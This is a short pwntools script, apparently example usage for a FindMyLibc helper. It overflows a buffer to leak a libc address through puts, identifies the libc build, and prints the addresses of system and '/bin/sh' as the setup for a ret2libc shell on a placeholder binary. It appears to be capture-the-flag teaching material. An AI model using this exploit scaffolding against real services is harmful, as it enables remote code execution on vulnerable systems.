from pwn import *
from FindMyLibc import *

# Setup your binary
elf = ELF("./elf_name")
host = args.HOST or 'localhost'
port = int(args.PORT or 5555)
io = connect(host, port)

# Payload until right before the return address
payload = b'A' * 512 + b'BBBBCCCCDDDD'

# Example function that gets a symbol name and leaks its address from the binary
def leak_libc_address(symbol_name):
    libc_symbol_address = elf.got[symbol_name]
    puts = elf.symbols["puts"]

    io.recvline()
    io.send(payload + p32(puts) + p32(libc_symbol_address))
    received = io.recv()

    return u64(received.ljust(8, b"\x00"))

# call `find_libc`, it returns a list of matching libc candidates.
matching_libc = find_libc(elf, leak_libc_address)
chosen_libc = matching_libc[0]

# Each libc candidate comes with the attribute of `base_address`
print("libc base_address at: %s " % hex(chosen_libc['base_address']))

# Everything you need is probably in `syms`,
# a dictionary of ALL the libc symbols: {symbol: calculated_address}
binsh_address = chosen_libc['syms']['str_bin_sh']
system_address = chosen_libc['syms']['system']
print("/bin/sh at: %s" % hex(binsh_address))
print("system at: %s " % hex(system_address))
